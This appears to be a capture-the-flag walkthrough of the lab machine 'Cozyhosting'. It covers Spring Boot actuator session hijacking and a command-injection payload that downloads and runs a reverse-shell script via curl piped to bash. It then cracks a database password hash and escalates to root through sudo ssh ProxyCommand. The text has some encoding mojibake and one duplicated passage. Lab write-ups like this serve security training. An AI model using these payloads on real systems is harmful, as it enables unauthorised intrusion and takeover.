Jul 8, 2022

Cozyhosting

Enumeration

Nmap:-

nmap -A -T4 -p- -o nmap.txt 10.129.119.165

Host is up (0.28s latency).

OS:=S)

Upon visiting the website, it redirects to http://cozyhosting.htb/.

Adding the Hostname:

nano /etc/hosts

Website

Login Page:-

Discovering Hidden Directories:

ffuf -u http://cozyhosting.htb/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt

Accessing the /error Page:

Let‚Äôs research this error on Google:

We‚Äôve discovered different endpoints of Spring Boot:

There‚Äôs an endpoint called ‚Äúsessions‚Äù that provides the current user‚Äôs sessions:

When we make a CURL request to ‚Äúsessions,‚Äù we retrieve the sessions:

curl 'http://cozyhosting.htb/actuator/sessions' -i -X GET

Let‚Äôs access the login page with the session:

The username field is vulnerable to command injection, allowing us to execute commands by ending them with a semicolon:

However, it‚Äôs forbidden to provide spaces:

We can bypass the space restriction by using ${IFS}:

Let‚Äôs create a reverse shell:

echo 'sh -i >& /dev/tcp/10.10.14.16/4444 0>&1' > rev.sh

I‚Äôve hosted a server on port 8000:

sudo python3 -m http.server

Let‚Äôs start a listener on port 4444:

sudo nc -lvnp 4444

To get a reverse shell, add the following command to the username field and send the request:

;curl${IFS}http://10.10.14.16:8000/rev.sh|bash;

Finally, we have obtained shell access.

Found cloudhosting-0.0.1.jar in current directory.Let‚Äôs get the file in our system to analysis it.

When I run the jar file, Its using postgresql.

We found ‚Äúcloudhosting-0.0.1.jar‚Äù in the current directory. Let‚Äôs retrieve the file for analysis.

Upon running the JAR file, it appears to be using PostgreSQL:

jar xf cloudhosting-0.0.1.jar

Let‚Äôs find the PostgreSQL details and extract information from ‚Äúcloudhosting-0.0.1.jar‚Äù:

psql -h localhost -d cozyhosting -U postgres -W

To crack the password, we can use John the Ripper:

sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash

There‚Äôs a user called ‚Äújosh.‚Äù Let‚Äôs log in using the same password:

Finally, we have gained user access as ‚Äújosh.‚Äù

Privilege Escalation:

To find out the sudo privilege details, run:

sudo -l

We can use Gftobins for sudo privilege escalation:

sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x

Finally, we have achieved a root shell.
